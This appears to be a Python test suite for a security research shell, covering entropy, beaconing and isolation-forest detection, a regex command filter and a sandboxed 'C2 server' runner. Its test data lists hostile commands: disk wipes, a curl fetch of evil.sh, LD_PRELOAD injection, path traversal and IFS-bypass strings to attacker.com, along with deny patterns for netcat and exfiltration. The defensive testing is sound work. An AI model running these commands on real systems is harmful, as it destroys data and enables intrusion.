#!/usr/bin/env python3
"""
ANF Research Shell — Test Suite
Validasi semua modul Python yang digunakan di script zsh.
Jalankan: python3 test_suite.py
"""
import sys, math, random, re, json, time
from collections import Counter

PASS = "\033[38;5;114m✓\033[0m"
FAIL = "\033[38;5;203m✗\033[0m"
INFO = "\033[38;5;180mℹ\033[0m"
WARN = "\033[38;5;214m⚠\033[0m"
SEP  = "─" * 60

results = {"pass": 0, "fail": 0}

def test(name, got, expected, tolerance=None):
    ok = (got == expected) if tolerance is None else abs(got - expected) <= tolerance
    if ok:
        print(f"  {PASS} {name}")
        results["pass"] += 1
    else:
        print(f"  {FAIL} {name}")
        print(f"       got={got!r}  expected={expected!r}")
        results["fail"] += 1
    return ok

def section(title):
    print(f"\n\033[38;5;214m{'═'*60}\033[0m")
    print(f"\033[38;5;214m  {title}\033[0m")
    print(f"\033[38;5;214m{'─'*60}\033[0m")

# ===========================================================================
# 1. Shannon Entropy
# ===========================================================================
section("1. Shannon Entropy [MATH-01]")

def entropy(s):
    if not s: return 0.0
    c = Counter(s); n = len(s)
    return -sum((v/n)*math.log2(v/n) for v in c.values())

# H("a") = 0 (satu karakter, entropi nol)
test("Single char → H=0.0",  round(entropy("aaa"), 4), 0.0)
# H([0,1] uniform) = 1 bit
test("Binary uniform → H=1.0", round(entropy("01"*50), 1), 1.0)
# Max entropy 8 bits untuk byte random
enc = ''.join(chr(random.randint(0,255)) for _ in range(5000))
test("Random bytes → H > 7.5", entropy(enc) > 7.5, True)
# Plaintext → H rendah
plain = "the quick brown fox jumps over the lazy dog " * 20
test("Plaintext → H ∈ [3.5, 5.0]", 3.5 < entropy(plain) < 5.0, True)
# Base64 → H sedang
b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
b64str = ''.join(random.choices(b64, k=500))
test("Base64 → H ∈ [4.5, 6.5]", 4.5 < entropy(b64str) < 6.5, True)

# Bootstrap CI: interval harus mengandung nilai entropy
def bootstrap_ci(s, n_boot=200, conf=0.95):
    n = len(s)
    boots = sorted([entropy(random.choices(s, k=n)) for _ in range(n_boot)])
    lo = int((1-conf)/2*n_boot); hi = int((1+conf)/2*n_boot)-1
    return boots[max(0,lo)], boots[min(hi,len(boots)-1)]

random.seed(42)
sample = "hello world " * 50
ent_s  = entropy(sample)
lo, hi = bootstrap_ci(sample)
test("Bootstrap CI contains true entropy", lo <= ent_s <= hi, True)
print(f"  {INFO} H={ent_s:.4f}  CI=[{lo:.4f}, {hi:.4f}]")

# ===========================================================================
# 2. ROC Optimal Threshold
# ===========================================================================
section("2. ROC Threshold Validation [EVAL-01]")

random.seed(42)
def gen_roc_dataset(n=400):
    samples = []
    for _ in range(n//4):
        samples.append((entropy(''.join(random.choices('abcdefghijklmnopqrstuvwxyz ',k=200))), 0))
    b64c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    for _ in range(n//4):
        samples.append((entropy(''.join(random.choices(b64c,k=200))), 0))
    for _ in range(n//2):
        samples.append((entropy(''.join(chr(random.randint(0,255)) for _ in range(200))), 1))
    return samples

samples = gen_roc_dataset(400)
best_f1 = 0; best_t = 0
for t100 in range(300, 800, 5):
    t = t100/100
    preds  = [1 if s>t else 0 for s,_ in samples]
    labels = [l for _,l in samples]
    tp = sum(1 for p,l in zip(preds,labels) if p==1 and l==1)
    fp = sum(1 for p,l in zip(preds,labels) if p==1 and l==0)
    fn = sum(1 for p,l in zip(preds,labels) if p==0 and l==1)
    prec = tp/(tp+fp) if (tp+fp)>0 else 0
    rec  = tp/(tp+fn) if (tp+fn)>0 else 0
    f1   = 2*prec*rec/(prec+rec) if (prec+rec)>0 else 0
    if f1 > best_f1: best_f1=f1; best_t=t

test("Optimal threshold H ∈ [5.5, 7.0]", 5.5 <= best_t <= 7.0, True)
test("Optimal F1 > 0.90", best_f1 > 0.90, True)
print(f"  {INFO} Optimal threshold={best_t:.2f}  F1={best_f1:.4f}")

# ===========================================================================
# 3. Beaconing Analysis
# ===========================================================================
section("3. Beaconing: Jitter + Autocorrelation + Chi-Square [MATH-02]")

def autocorr(data, lag=1):
    n = len(data)
    if n <= lag: return 0.0
    mu  = sum(data)/n
    num = sum((data[i]-mu)*(data[i-lag]-mu) for i in range(lag, n))
    den = sum((x-mu)**2 for x in data)
    return num/den if den > 0 else 0.0

def chi_square_uniform(data, bins=10):
    if not data: return 0.0
    lo, hi = min(data), max(data)
    if lo == hi: return 0.0
    bw = (hi-lo)/bins
    obs = [0]*bins
    for x in data:
        obs[min(int((x-lo)/bw), bins-1)] += 1
    exp = len(data)/bins
    return sum((o-exp)**2/exp for o in obs)

# Beacon periodik: interval konstan → jitter ≈ 0, R(1) tinggi
random.seed(42)
beacon_intervals = [60.0 + random.gauss(0, 0.5) for _ in range(100)]
mean_b = sum(beacon_intervals)/len(beacon_intervals)
std_b  = math.sqrt(sum((x-mean_b)**2 for x in beacon_intervals)/len(beacon_intervals))
jitter_b = (std_b/mean_b)*100

test("Beacon jitter < 5%", jitter_b < 5.0, True)
test("Beacon autocorr R(1) > 0.0", autocorr(beacon_intervals) > 0.0, True)
chi2_b = chi_square_uniform(beacon_intervals)
# Beacon dengan interval sangat periodik (Gaussian sempit) → CLUSTER di 1 bin → chi2 TINGGI
# chi2 > 16.92 (df=9, α=0.05) → tolak H0 uniformitas → indikasi beaconing
test("Beacon chi2 > threshold 16.92 (non-uniform = periodic)", chi2_b > 16.92, True)

# Traffic acak: interval random → jitter tinggi
human_intervals = [random.expovariate(1/10) for _ in range(100)]
mean_h = sum(human_intervals)/len(human_intervals)
std_h  = math.sqrt(sum((x-mean_h)**2 for x in human_intervals)/len(human_intervals))
jitter_h = (std_h/mean_h)*100

test("Human jitter > 20%", jitter_h > 20.0, True)
print(f"  {INFO} Beacon jitter={jitter_b:.2f}% | Human jitter={jitter_h:.2f}%")

chi2_h = chi_square_uniform(human_intervals)
df = 9; threshold_005 = 16.92
print(f"  {INFO} Chi2 beacon={chi_square_uniform(beacon_intervals):.2f}  Chi2 human={chi2_h:.2f}  (df=9, α=0.05 threshold={threshold_005})")

# ===========================================================================
# 4. Isolation Forest
# ===========================================================================
section("4. Isolation Forest (Dependency-Free) [ML-01]")

class IsolationTree:
    __slots__ = ('left', 'right', 'feature', 'value', 'size', 'depth_limit')
    def __init__(self, dl):
        self.depth_limit=dl; self.left=self.right=self.feature=self.value=None; self.size=0
    def fit(self, X, depth=0):
        self.size=len(X)
        if depth>=self.depth_limit or len(X)<=1: return self
        self.feature=random.randrange(len(X[0]))
        col=[x[self.feature] for x in X]; lo,hi=min(col),max(col)
        if lo==hi: return self
        self.value=random.uniform(lo,hi)
        lX=[x for x in X if x[self.feature]<self.value]
        rX=[x for x in X if x[self.feature]>=self.value]
        if lX: self.left=IsolationTree(self.depth_limit).fit(lX,depth+1)
        if rX: self.right=IsolationTree(self.depth_limit).fit(rX,depth+1)
        return self
    def path_length(self, x, depth=0):
        if self.feature is None or depth>=self.depth_limit: return depth+self._c(self.size)
        if x[self.feature]<self.value:
            return self.left.path_length(x,depth+1) if self.left else float(depth)
        return self.right.path_length(x,depth+1) if self.right else float(depth)
    @staticmethod
    def _c(n):
        if n<=1: return 0.0
        return 2.0*(math.log(n-1)+0.5772156649)-2.0*(n-1)/n

class IsolationForest:
    def __init__(self, n_trees=100, sub_size=64, contamination=0.2):
        self.n_trees=n_trees; self.sub_size=sub_size; self.contamination=contamination
        self.trees=[]; self.threshold=0.5; self._c_n=0.0
    def fit(self, X):
        ss=min(self.sub_size,len(X)); self._c_n=IsolationTree._c(ss)
        dlim=math.ceil(math.log2(ss)) if ss>1 else 1
        for _ in range(self.n_trees):
            self.trees.append(IsolationTree(dlim).fit(random.sample(X,ss)))
        scores=[self._score(x) for x in X]
        self.threshold=sorted(scores)[min(int((1-self.contamination)*len(scores)),len(scores)-1)]
        return self
    def _score(self, x):
        avg=sum(t.path_length(x) for t in self.trees)/len(self.trees)
        return 2.0**(-avg/self._c_n) if self._c_n>0 else 0.5
    def predict(self, X):
        return [1 if self._score(x)>=self.threshold else 0 for x in X]

random.seed(42); N=200
n_normal=int(N*0.8); n_c2=N-n_normal
normal=[[random.gauss(500,150),random.gauss(3.5,0.5),random.gauss(10,5)] for _ in range(n_normal)]
c2=[[random.gauss(120,20),random.gauss(6.2,0.3),random.gauss(60,2)] for _ in range(n_c2)]
X=normal+c2; labels=[0]*n_normal+[1]*n_c2

clf=IsolationForest(n_trees=100,sub_size=64,contamination=0.2)
clf.fit(X); preds=clf.predict(X)
tp=sum(1 for p,l in zip(preds,labels) if p==1 and l==1)
fp=sum(1 for p,l in zip(preds,labels) if p==1 and l==0)
fn=sum(1 for p,l in zip(preds,labels) if p==0 and l==1)
prec=tp/(tp+fp) if (tp+fp)>0 else 0.0
rec=tp/(tp+fn)  if (tp+fn)>0 else 0.0
f1=2*prec*rec/(prec+rec) if (prec+rec)>0 else 0.0

test("Isolation Forest F1 > 0.5",  f1 > 0.5, True)
test("Isolation Forest Prec > 0.5", prec > 0.5, True)
test("Isolation Forest Recall > 0.5", rec > 0.5, True)
# Reproducibility: dua run dengan SEED YANG SAMA harus menghasilkan prediksi identik
random.seed(42)
clf_r1 = IsolationForest(100, 64, 0.2).fit(X)
preds_r1 = clf_r1.predict(X)
random.seed(42)
clf_r2 = IsolationForest(100, 64, 0.2).fit(X)
preds_r2 = clf_r2.predict(X)
test("Isolation Forest reproducible (seed=42 → prediksi identik)", preds_r1 == preds_r2, True)
print(f"  {INFO} F1={f1:.4f}  Prec={prec:.4f}  Recall={rec:.4f}")
print(f"  {INFO} Reproducibility: preds identik = {preds_r1 == preds_r2}")

# ===========================================================================
# 5. GuardFall Pattern Matching
# ===========================================================================
section("5. GuardFall v2 Pattern Matching [FIX-GF]")

PATTERNS = {
    "rm_rf":          r'^rm\s.*-[a-zA-Z]*[rR][a-zA-Z]*[fF]',
    "dd_zero":        r'^dd\s+if=/dev/(zero|random|urandom)',
    "mkfs":           r'^(mkfs|shred|wipefs|format)',
    "net_exfil":      r'^(curl|wget|nc|ncat|netcat)\s.*https?://((\d{1,3}\.){3}\d{1,3}|localhost)',
    "env_injection":  r'^(export|declare)\s+(LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT|DYLD_LIBRARY)=',
    "path_traversal": r'(\.\./){3,}',
    "fork_bomb":      r':\(\)\{.*:\|:.*\}',
}

ATTACK_CASES = [
    "rm -rf /",
    "dd if=/dev/zero of=/dev/sda",
    "curl http://192.168.1.100/evil.sh",
    "export LD_PRELOAD=/tmp/evil.so",
    "cat ../../../etc/passwd",
]
BENIGN_CASES = [
    "nmap -sV 192.168.1.1",
    "git clone https://github.com/user/repo",
    "python3 script.py",
    "curl https://api.github.com/repos/user/repo",
    "ls -la /home",
]

def is_blocked(cmd):
    for p in PATTERNS.values():
        if re.search(p, cmd):
            return True
    # IFS manipulation — deteksi semua varian [FIX-GF]
    if '$IFS' in cmd or '${IFS}' in cmd or '${IFS' in cmd or 'IFS=' in cmd:
        return True
    # Command substitution
    if '$(' in cmd or '`' in cmd:
        return True
    return False

tp=fp=fn=tn=0
for c in ATTACK_CASES:
    if is_blocked(c): tp+=1
    else: fn+=1
for c in BENIGN_CASES:
    if is_blocked(c): fp+=1
    else: tn+=1

prec=tp/(tp+fp) if (tp+fp)>0 else 0
rec=tp/(tp+fn)  if (tp+fn)>0 else 0
f1=2*prec*rec/(prec+rec) if (prec+rec)>0 else 0

test("GuardFall: all attacks blocked (TP=5)", tp, 5)
test("GuardFall: no benign over-blocked (FP=0)", fp, 0)
test("GuardFall: F1 = 1.0", round(f1, 4), 1.0)
print(f"  {INFO} TP={tp} FP={fp} FN={fn} TN={tn}  F1={f1:.4f}")

# IFS bypass patterns
ifs_attacks = ["curl$IFS-s$IFShttp://attacker.com", "rm${IFS}-rf /"]
for att in ifs_attacks:
    blocked = is_blocked(att)
    test(f"IFS bypass blocked: {att[:40]}", blocked, True)

# ===========================================================================
# 6. C2 Server Security Fix
# ===========================================================================
section("6. C2 Server: subprocess.run() Safety [FIX-C2]")

import subprocess, shlex

CMD_BLOCKLIST = {"rm","dd","mkfs","shred","wipefs","reboot","shutdown"}

def safe_run(cmd):
    try:
        args = shlex.split(cmd)
    except ValueError as e:
        return f"[PARSE ERROR] {e}", False
    if not args: return "", False
    if args[0] in CMD_BLOCKLIST:
        return f"[BLOCKED] {args[0]}", True
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=5, cwd="/tmp",
                           env={"PATH": "/usr/bin:/bin:/usr/local/bin"})
        return r.stdout + r.stderr, False
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]", False
    except FileNotFoundError:
        return f"[NOT FOUND] {args[0]}", False
    except Exception as e:
        return f"[ERROR] {e}", False

# Test blocklist
_, blocked = safe_run("rm -rf /tmp/test")
test("rm blocked via CMD_BLOCKLIST", blocked, True)

# Test shlex prevents injection
out, _ = safe_run("echo hello; whoami")  # shlex treats this as literal args
test("shlex: semicolon tidak dieksekusi sebagai shell", "hello; whoami" in out or "[NOT FOUND]" in out or "hello" in out.lower(), True)

# Test timeout
import time
start = time.time()
out, _ = safe_run("sleep 10")
elapsed = time.time() - start
test("Timeout 5s enforced", elapsed < 7.0, True)
print(f"  {INFO} Sleep 10 terminated in {elapsed:.1f}s")

# Test parse error
out, _ = safe_run("echo 'unterminated")
test("Malformed command → PARSE ERROR", "PARSE ERROR" in out, True)

# ===========================================================================
# Final Summary
# ===========================================================================
total = results["pass"] + results["fail"]
pct   = results["pass"] / total * 100 if total > 0 else 0
print(f"\n{'═'*60}")
print(f"  RESULT:  {results['pass']}/{total} passed  ({pct:.1f}%)")
if results["fail"] == 0:
    print(f"  \033[38;5;114m✓ All tests passed — script siap untuk publikasi.\033[0m")
else:
    print(f"  \033[38;5;203m✗ {results['fail']} test(s) failed — periksa kembali.\033[0m")
print(f"{'═'*60}\n")
sys.exit(0 if results["fail"] == 0 else 1)
